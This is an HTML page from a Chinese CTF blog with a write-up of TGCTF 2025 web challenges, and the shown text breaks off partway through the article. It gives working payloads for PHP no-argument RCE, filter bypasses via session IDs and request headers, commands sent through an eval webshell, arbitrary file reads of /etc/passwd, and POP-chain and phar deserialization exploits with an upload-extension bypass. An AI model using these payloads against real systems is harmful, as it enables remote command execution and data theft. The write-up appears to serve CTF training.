@@ -1,0 +1,796 @@
+
+  <!DOCTYPE html>
+  <html lang="zh-CN"  >
+  <head>
+  <meta charset="utf-8">
+  
+
+  
+
+  
+
+  <script>window.REIMU_CONFIG = {};window.REIMU_CONFIG.icon_font = '4552607_bq08450reo';window.REIMU_CONFIG.clipboard_tips = {"success":"复制成功(*^▽^*)","fail":"复制失败 (ﾟ⊿ﾟ)ﾂ","copyright":{"enable":false,"count":50,"content":"本文版权：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处！"}};window.REIMU_CONFIG.code_block = {"expand":true};</script>
+  
+  <title>
+    TGCTF比赛复现 |
+    
+    KL
+  </title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <link rel="preconnect" href="https://fonts.gstatic.com/" crossorigin><link rel="preload" as="style" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic%7CNoto%20Serif%20SC:400,400italic,700,700italic&display=swap"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic%7CNoto%20Serif%20SC:400,400italic,700,700italic&display=swap" media="print" onload="this.media&#x3D;&#39;all&#39;">
+  
+    <link rel="preload" href="//at.alicdn.com/t/c/font_4552607_bq08450reo.woff2" as="font" type="font/woff2" crossorigin="anonymous">
+  
+  
+    
+<link rel="stylesheet" href="/css/loader.css">
+
+  
+  
+    <meta name="description" content="[TOC]  web  AAA偷渡阴平 无参数rce 用chdir(next(scandir(current(localeconv()))));转移到上层路径 转移到根目录需要三次 然后直接用readfile(flag)读取flag 1?tgctf2025&#x3D;chdir(next(scandir(current(localeconv()))));chdir(next(scandir(current(">
+<meta property="og:type" content="article">
+<meta property="og:title" content="TGCTF比赛复现">
+<meta property="og:url" content="http://example.com/2025/04/12/TGCTF%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/index.html">
+<meta property="og:site_name" content="KL">
+<meta property="og:description" content="[TOC]  web  AAA偷渡阴平 无参数rce 用chdir(next(scandir(current(localeconv()))));转移到上层路径 转移到根目录需要三次 然后直接用readfile(flag)读取flag 1?tgctf2025&#x3D;chdir(next(scandir(current(localeconv()))));chdir(next(scandir(current(">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/2025/04/12/images/20250412230853777.png">
+<meta property="og:image" content="http://example.com/2025/04/12/images/20250413105200684.png">
+<meta property="og:image" content="http://example.com/2025/04/12/images/20250414222203159.png">
+<meta property="og:image" content="http://example.com/2025/04/12/images/20250414222223914.png">
+<meta property="article:published_time" content="2025-04-12T03:16:49.000Z">
+<meta property="article:modified_time" content="2026-01-25T04:04:17.203Z">
+<meta property="article:author" content="FuB0Y">
+<meta property="article:tag" content="比赛复现">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2025/04/12/images/20250412230853777.png">
+  
+  
+    <link rel="alternate" href="/atom.xml" title="KL" type="application/atom+xml">
+  
+  
+    <link rel="shortcut icon" href="/images/favicon.ico">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  <link rel="preload" href="https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+  
+    
+      
+        
+<link rel="stylesheet" href="https://npm.webcache.cn/katex@0.16.11/dist/katex.min.css">
+
+      
+    
+  
+  
+  
+  
+    
+<script src="https://npm.webcache.cn/pace-js@1.2.4/pace.min.js" integrity="sha384-k6YtvFUEIuEFBdrLKJ3YAUbBki333tj1CSUisai5Cswsg9wcLNaPzsTHDswp4Az8" crossorigin="anonymous"></script>
+
+  
+  
+    
+<link rel="stylesheet" href="https://npm.webcache.cn/@reimujs/aos@0.1.0/dist/aos.css">
+
+  
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+  <body>
+    
+  <div id='loader'>
+    <div class="loading-left-bg loading-bg"></div>
+    <div class="loading-right-bg loading-bg"></div>
+    <div class="spinner-box">
+      <div class="loading-taichi">
+        
+          <svg width="150" height="150" viewBox="0 0 1024 1024" class="icon" version="1.1" xmlns="https://www.w3.org/2000/svg" shape-rendering="geometricPrecision">
+            <path d="M303.5 432A80 80 0 0 1 291.5 592A80 80 0 0 1 303.5 432z" fill="var(--red-1, #ff5252)" />
+            <path d="M512 65A447 447 0 0 1 512 959L512 929A417 417 0 0 0 512 95A417 417 0 0 0 512 929L512 959A447 447 0 0 1 512 65z 
+           M512 95A417 417 0 0 1 929 512A208.5 208.5 0 0 1 720.5 720.5L720.5 592A80 80 0 0 0 720.5 432A80 80 0 0 0 720.5 592L720.5 720.5A208.5 208.5 0 0 1 512 512A208.5 208.5 0 0 0 303.5 303.5A208.5 208.5 0 0 0 95 512A417 417 0 0 1 512 95z" fill="var(--red-1, #ff5252)" />
+          </svg>
+        
+      </div>
+      <div class="loading-word">少女祈祷中...</div>
+    </div>
+  </div>
+  </div>
+  <script>
+    var time = null;
+    var startLoading = () => {
+      time = Date.now();
+      document.getElementById('loader').classList.remove("loading");
+    }
+    var endLoading = () => {
+      if (!time) {
+        document.body.style.overflow = 'auto';
+        document.getElementById('loader').classList.add("loading");
+      } else {
+        if (Date.now() - time > 500) {
+          time = null;
+          document.body.style.overflow = 'auto';
+          document.getElementById('loader').classList.add("loading");
+        } else {
+          setTimeout(endLoading, 500 - (Date.now() - time));
+          time = null;
+        }
+      }
+    }
+    window.addEventListener('DOMContentLoaded', endLoading);
+    document.getElementById('loader').addEventListener('click', endLoading);
+  </script>
+
+<div id="copy-tooltip" style="pointer-events: none; opacity: 0; transition: all 0.2s ease; position: fixed;top: 50%;left: 50%;z-index: 999;transform: translate(-50%, -50%);color: white;background: rgba(0, 0, 0, 0.5);padding: 10px 15px;border-radius: 10px;">
+</div>
+
+
+    <div id="container">
+      <div id="wrap">
+        <div id="header-nav">
+  <nav id="main-nav">
+    
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon rotate">
+            &#xe62b;
+          </div>
+          <a class="main-nav-link" href="/">首页</a>
+        </span>
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon rotate">
+            &#xe62b;
+          </div>
+          <a class="main-nav-link" href="/archives">归档</a>
+        </span>
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon rotate">
+            &#xe62b;
+          </div>
+          <a class="main-nav-link" href="/about">关于</a>
+        </span>
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon rotate">
+            &#xe62b;
+          </div>
+          <a class="main-nav-link" href="/friend">友链</a>
+        </span>
+      
+    
+    <a id="main-nav-toggle" class="nav-icon"></a>
+  </nav>
+  <nav id="sub-nav">
+    
+      <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS 订阅" target="_blank"></a>
+    
+    
+    
+  </nav>
+</div>
+<header id="header">
+  
+    <picture></picture>
+    <img fetchpriority="high" src="/../images/17384736097c9d.jpg" alt="TGCTF比赛复现">
+  
+  <div id="header-outer">
+    <div id="header-title">
+      
+        
+        
+          <a href="/" id="logo">
+            <h1 data-aos="slide-up">TGCTF比赛复现</h1>
+          </a>
+        
+      
+      
+        
+        <h2 id="subtitle-wrap" data-aos="slide-down">
+          
+        </h2>
+      
+    </div>
+  </div>
+</header>
+
+        <div id="content"  class="sidebar-right" >
+          <aside id="sidebar">
+  
+  
+  <div class="sidebar-wrapper wrap-sticky">
+    <div class="sidebar-wrap" data-aos="fade-up">
+      
+        <div class="sidebar-toc-sidebar"><div class="sidebar-toc">
+  <h3 class="toc-title">文章目录</h3>
+  <div class="sidebar-toc-wrapper toc-div-class" >
+      
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#web"><span class="toc-number">1.</span> <span class="toc-text"> web</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#aaa%E5%81%B7%E6%B8%A1%E9%98%B4%E5%B9%B3"><span class="toc-number">1.1.</span> <span class="toc-text"> AAA偷渡阴平</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%81%B7%E6%B8%A1%E9%98%B4%E5%B9%B3%E5%A4%8D%E4%BB%87"><span class="toc-number">1.2.</span> <span class="toc-text"> 偷渡阴平(复仇)</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B3%95%E4%B8%80"><span class="toc-number">1.2.1.</span> <span class="toc-text"> 法一：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B3%95%E4%BA%8C"><span class="toc-number">1.2.2.</span> <span class="toc-text"> 法二</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%81%AB%E7%9C%BC%E8%BE%A9%E9%AD%91%E9%AD%85"><span class="toc-number">1.3.</span> <span class="toc-text"> 火眼辩魑魅</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9B%B4%E9%9D%A2%E5%A4%A9%E5%91%BD"><span class="toc-number">1.4.</span> <span class="toc-text"> 直面天命</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0"><span class="toc-number">1.5.</span> <span class="toc-text"> 什么文件上传</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%A4%8D%E4%BB%87"><span class="toc-number">1.6.</span> <span class="toc-text"> 什么文件上传？（复仇）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9B%B4%E9%9D%A2%E5%A4%A9%E5%91%BD%E5%A4%8D%E4%BB%87"><span class="toc-number">1.7.</span> <span class="toc-text"> 直面天命（复仇）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ezupload"><span class="toc-number">1.8.</span> <span class="toc-text"> (ez)upload</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%89%8D%E7%AB%AFgame"><span class="toc-number">1.9.</span> <span class="toc-text"> 前端GAME</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%89%8D%E7%AB%AFgame-plus"><span class="toc-number">1.10.</span> <span class="toc-text"> 前端GAME Plus</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%89%8D%E7%AB%AFgame-ultra"><span class="toc-number">1.11.</span> <span class="toc-text"> 前端GAME Ultra</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#tgctf2025-%E5%90%8E%E5%8F%B0%E7%AE%A1%E7%90%86"><span class="toc-number">1.12.</span> <span class="toc-text"> TGCTF2025 后台管理</span></a></li></ol></li></ol>
+      
+  </div>
+</div>
+</div>
+        <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/avatar/avatar.jpg" data-sizes="auto" alt="FuB0Y" class="lazyload">
+  <div class="sidebar-author-name">FuB0Y</div>
+  <div class="sidebar-description">世所谓英雄者，不以挫抑而灰心，不以失败而退怯</div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>文章</div>
+    <div class="sidebar-state-number">396</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>分类</div>
+    <div class="sidebar-state-number">13</div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>标签</div>
+    <div class="sidebar-state-number">327</div>
+  </div>
+</div>
+<div class="sidebar-social">
+  
+</div>
+<div class="sidebar-menu">
+  
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/" aria-label="首页"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">首页</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/archives" aria-label="归档"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">归档</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/about" aria-label="关于"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">关于</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/friend" aria-label="友链"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">友链</div>
+      </div>
+    
+  
+</div>
+</div>
+      
+      
+        <div class="sidebar-btn-wrapper" style="position:static">
+          <div class="sidebar-toc-btn current"></div>
+          <div class="sidebar-common-btn"></div>
+        </div>
+      
+    </div>
+  </div>
+
+  <div class="sidebar-widget">
+  
+  </div>
+</aside>
+
+          <section id="main"><article id="post-TGCTF比赛复现" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-inner" data-aos="fade-up">
+    <div class="article-meta">
+      <div class="article-date">
+  <a href="/2025/04/12/TGCTF%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/" class="article-date-link" data-aos="zoom-in">
+    <time datetime="2025-04-12T03:16:49.000Z" itemprop="datePublished">2025-04-12</time>
+    <time style="display: none;" id="post-update-time">2026-01-25</time>
+  </a>
+</div>
+
+      
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/" data-aos="zoom-in">比赛复现</a>
+  </div>
+
+
+    </div>
+    <div class="hr-line"></div>
+    
+
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+      
+        <p>[TOC]</p>
+<h2 id="web"><a class="markdownIt-Anchor" href="#web"></a> web</h2>
+<h3 id="aaa偷渡阴平"><a class="markdownIt-Anchor" href="#aaa偷渡阴平"></a> <strong>AAA偷渡阴平</strong></h3>
+<p>无参数rce</p>
+<p>用<code>chdir(next(scandir(current(localeconv()))));</code>转移到上层路径</p>
+<p>转移到根目录需要三次</p>
+<p>然后直接用readfile(flag)读取flag</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?tgctf2025=chdir(next(scandir(current(localeconv()))));chdir(next(scandir(current(localeconv()))));chdir(next(scandir(current(localeconv()))));readfile(flag);</span><br></pre></td></tr></table></figure>
+<h3 id="偷渡阴平复仇"><a class="markdownIt-Anchor" href="#偷渡阴平复仇"></a> 偷渡阴平(复仇)</h3>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">if(!preg_match(&quot;/0|1|[3-9]|\~|\`|\@|\#|J $|\%|\^|\&amp;|\*|\（|\）|\M\\+|\ \</span><br><span class="line"> \]|\&#125;|\:|\&#x27;|\&quot;|\,|\n \.|\&gt;|\/|\?</span><br><span class="line">|\\\\|localeconv|pos|current|print|var|dump|getallheaders|get|defined|str|spli</span><br><span class="line">t|spl|autoload|extensions|eval|phpversion|floor|sqrt|tan|cosh|sinh|ceil|chr|di</span><br><span class="line">r|getcwd|getallheaders|end|next|prev|reset|each|pos|current|array|reverse|pop|</span><br><span class="line">rand|flip|flip|rand|content|echo|readfile|highlight|show|source|file|assert/i&quot;</span><br><span class="line">, $tgctf2025))&#123;</span><br><span class="line">    eval($tgctf2025);</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">    die(&#x27;(╯‵□′)╯炸弹！•••*～●&#x27;);</span><br><span class="line">&#125;</span><br><span class="line">highlight_file(\ZFILE\Z);</span><br></pre></td></tr></table></figure>
+<p>//ban了午餐无参rce</p>
+<h4 id="法一"><a class="markdownIt-Anchor" href="#法一"></a> 法一：</h4>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">没关闭session</span><br><span class="line">?tgctf2025=session_start();system(hex2bin(session_id()));</span><br><span class="line">PHPSESSID=636174202f666c6167       //cat /flag的十六进制</span><br></pre></td></tr></table></figure>
+<h4 id="法二"><a class="markdownIt-Anchor" href="#法二"></a> 法二</h4>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?tgctf2025=system(implode(apache_request_headers()));</span><br></pre></td></tr></table></figure>
+<h3 id="火眼辩魑魅"><a class="markdownIt-Anchor" href="#火眼辩魑魅"></a> <strong>火眼辩魑魅</strong></h3>
+<p>扫描发现robots.txt</p>
+<p>里面有个tgshell.php文件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    $shell=$_POST[&quot;shell&quot;];</span><br><span class="line">    &#123;</span><br><span class="line">        eval($shell);</span><br><span class="line">    &#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>尝试了一下，过滤了system,passthru等等</p>
+<p>但``没被过滤</p>
+<p>直接</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">shell=echo `ls /`;</span><br><span class="line">//发现tgfffffllllaagggggg</span><br><span class="line">shell=echo `cat /tgfffffllllaagggggg`</span><br><span class="line">得到flag</span><br></pre></td></tr></table></figure>
+<h3 id="直面天命"><a class="markdownIt-Anchor" href="#直面天命"></a> 直面天命</h3>
+<p>根据提示得到/aazz路由</p>
+<p>/aazz路由需要传一个参数</p>
+<p>直接用arjun扫描一下得到filename参数</p>
+<p>直接联想到是不是任意文件读取</p>
+<p><code>?filename=/etc/passwd</code>发现有回显文件</p>
+<p>直接?filename=/flag</p>
+<p>得到flag(全是运气成分，没有手法)</p>
+<h3 id="什么文件上传"><a class="markdownIt-Anchor" href="#什么文件上传"></a> 什么文件上传</h3>
+<p>根据源码提示访问/robots.txt</p>
+<p>发现/class.php</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">    error_reporting(0);</span><br><span class="line">    function best64_decode($str)</span><br><span class="line">    &#123;</span><br><span class="line">        return base64_decode(base64_decode(base64_decode(base64_decode(base64_decode($str)))));</span><br><span class="line">    &#125;</span><br><span class="line">    class yesterday &#123;</span><br><span class="line">        public $learn;</span><br><span class="line">        public $study=&quot;study&quot;;</span><br><span class="line">        public $try;</span><br><span class="line">        public function __construct()</span><br><span class="line">        &#123;</span><br><span class="line">            $this-&gt;learn = &quot;learn&lt;br&gt;&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">        public function __destruct()</span><br><span class="line">        &#123;</span><br><span class="line">            echo &quot;You studied hard yesterday.&lt;br&gt;&quot;;</span><br><span class="line">            return $this-&gt;study-&gt;hard();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    class today &#123;</span><br><span class="line">        public $doing;</span><br><span class="line">        public $did;</span><br><span class="line">        public $done;</span><br><span class="line">        public function __construct()&#123;</span><br><span class="line">            $this-&gt;did = &quot;What you did makes you outstanding.&lt;br&gt;&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">        public function __call($arg1, $arg2)</span><br><span class="line">        &#123;</span><br><span class="line">            $this-&gt;done = &quot;And what you&#x27;ve done has given you a choice.&lt;br&gt;&quot;;</span><br><span class="line">            echo $this-&gt;done;</span><br><span class="line">            if(md5(md5($this-&gt;doing))==666)&#123;</span><br><span class="line">                return $this-&gt;doing();</span><br><span class="line">            &#125;</span><br><span class="line">            else&#123;</span><br><span class="line">                return $this-&gt;doing-&gt;better;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    class tommoraw &#123;</span><br><span class="line">        public $good;</span><br><span class="line">        public $bad;</span><br><span class="line">        public $soso;</span><br><span class="line">        public function __invoke()&#123;</span><br><span class="line">            $this-&gt;good=&quot;You&#x27;ll be good tommoraw!&lt;br&gt;&quot;;</span><br><span class="line">            echo $this-&gt;good;</span><br><span class="line">        &#125;</span><br><span class="line">        public function __get($arg1)&#123;</span><br><span class="line">            $this-&gt;bad=&quot;You&#x27;ll be bad tommoraw!&lt;br&gt;&quot;;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    class future&#123;</span><br><span class="line">        private $impossible=&quot;How can you get here?&lt;br&gt;&quot;;</span><br><span class="line">        private $out;</span><br><span class="line">        private $no;</span><br><span class="line">        public $useful1;public $useful2;public $useful3;public $useful4;public $useful5;public $useful6;public $useful7;public $useful8;public $useful9;public $useful10;public $useful11;public $useful12;public $useful13;public $useful14;public $useful15;public $useful16;public $useful17;public $useful18;public $useful19;public $useful20;</span><br><span class="line"></span><br><span class="line">        public function __set($arg1, $arg2) &#123;</span><br><span class="line">            if ($this-&gt;out-&gt;useful7) &#123;</span><br><span class="line">                echo &quot;Seven is my lucky number&lt;br&gt;&quot;;</span><br><span class="line">                system(&#x27;whoami&#x27;);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        public function __toString()&#123;</span><br><span class="line">            echo &quot;This is your future.&lt;br&gt;&quot;;</span><br><span class="line">            system($_POST[&quot;wow&quot;]);</span><br><span class="line">            return &quot;win&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">        public function __destruct()&#123;</span><br><span class="line">            $this-&gt;no = &quot;no&quot;;</span><br><span class="line">            return $this-&gt;no;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    if (file_exists($_GET[&#x27;filename&#x27;]))&#123;</span><br><span class="line">        echo &quot;Focus on the previous step!&lt;br&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    else&#123;</span><br><span class="line">        $data=substr($_GET[&#x27;filename&#x27;],0,-4);</span><br><span class="line">        unserialize(best64_decode($data));</span><br><span class="line">    &#125;</span><br><span class="line">    // You learn yesterday, you choose today, can you get to your future?</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>反序列化</p>
+<p>构造pop链</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class yesterday &#123;</span><br><span class="line">    public $study;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class today &#123;</span><br><span class="line">    public $doing;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class tommoraw &#123;</span><br><span class="line">    public $better;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class future &#123;</span><br><span class="line">    public $out;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$future = new future();</span><br><span class="line"></span><br><span class="line">$today = new today();</span><br><span class="line">$today-&gt;doing = $future;</span><br><span class="line"></span><br><span class="line">$yesterday = new yesterday();</span><br><span class="line">$yesterday-&gt;study = $today;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$payload = serialize($yesterday);</span><br><span class="line">for ($i = 0; $i &lt; 5; $i++) &#123;</span><br><span class="line">    $payload = base64_encode($payload);</span><br><span class="line">&#125;</span><br><span class="line">echo $payload;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>然后就能传参wow命令执行了</p>
+<p><img src="../images/20250412230853777.png" alt="image-20250412230853777" /></p>
+<h3 id="什么文件上传复仇"><a class="markdownIt-Anchor" href="#什么文件上传复仇"></a> <strong>什么文件上传？（复仇）</strong></h3>
+<p>根据提示说需要phar反序列化</p>
+<p>和上题一样先访问/class.php</p>
+<p>发现有一个<code>file_exists($_GET['filename'])</code></p>
+<p>file_exists是受phar反序列化影响的函数，且里面的参数是我们可控的</p>
+<p>那我们直接构造就行了</p>
+<p>pop链</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class yesterday &#123;</span><br><span class="line">    public $study;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class today &#123;</span><br><span class="line">    public $doing;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class tommoraw &#123;</span><br><span class="line">    public $better;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class future &#123;</span><br><span class="line">    public $out;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$future = new future();</span><br><span class="line"></span><br><span class="line">$today = new today();</span><br><span class="line">$today-&gt;doing = $future;</span><br><span class="line"></span><br><span class="line">$yesterday = new yesterday();</span><br><span class="line">$yesterday-&gt;study = $today;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$phar = new Phar(&#x27;tg.phar&#x27;);</span><br><span class="line">$phar-&gt;startBuffering();</span><br><span class="line">// 设置stub</span><br><span class="line">$phar-&gt;setStub(&#x27;&lt;?php __HALT_COMPILER(); ?&gt;&#x27;);</span><br><span class="line">//</span><br><span class="line">$phar-&gt;setMetadata($yesterday);</span><br><span class="line">// 要压缩的文件</span><br><span class="line">$phar-&gt;addFromString(&#x27;tg.txt&#x27;,&#x27;test&#x27;);</span><br><span class="line">$phar-&gt;stopBuffering();</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>但我们发现上传的文件名后缀似乎被限制了，而且robots.txt中说文件名后缀是三位小写字母</p>
+<p>那菜鸟只能先fuzz测试了</p>
+<p>爆破出来有个atg文件能上传</p>
+<p>直接将tg.phar改为tg.atg</p>
+<p>上传</p>
+<p>然后回到/class.php</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">//用phar伪协议读取</span><br><span class="line">/class.php?filename=phar://uploads/tg.atg</span><br><span class="line"></span><br><span class="line">wow=ls</span><br></pre></td></tr></table></figure>
+<p>发现回显</p>
